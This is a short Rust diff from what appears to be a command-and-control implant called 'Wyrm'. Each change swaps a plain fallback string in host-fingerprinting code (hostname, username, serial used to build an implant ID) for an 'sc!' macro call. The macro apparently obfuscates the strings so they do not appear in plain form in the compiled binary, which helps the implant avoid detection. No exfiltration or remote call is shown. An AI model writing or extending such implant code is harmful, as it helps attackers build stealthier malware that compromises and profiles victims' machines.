@@ -449,7 +449,7 @@ impl Wyrm {
                     GetLastError()
                 ));
 
-                "unknown".to_string()
+                sc!("unknown", 178).unwrap()
             } else {
                 String::from_utf16_lossy(&buf)
             }
@@ -489,7 +489,7 @@ fn build_implant_id() -> String {
     {
         format!("{buf}")
     } else {
-        String::from("no_serial")
+        sc!("no_serial", 176).unwrap()
     };
 
     let hostname = get_hostname();
@@ -502,7 +502,7 @@ fn build_implant_id() -> String {
         let result = unsafe { GetUserNameW(PWSTR::from(buf.as_ptr() as *mut _), &mut len) };
 
         if result == 0 || len == 0 {
-            "UNKNOWN".to_string()
+            sc!("UNKNOWN", 56).unwrap()
         } else {
             String::from_utf16_lossy(&buf[0..len as usize - 1])
         }
@@ -524,7 +524,7 @@ pub fn get_hostname() -> String {
         let slice = &buf[..size as usize];
         String::from_utf16_lossy(slice)
     } else {
-        String::from("err_username")
+        sc!("err_username", 104).unwrap()
     }
 }
 
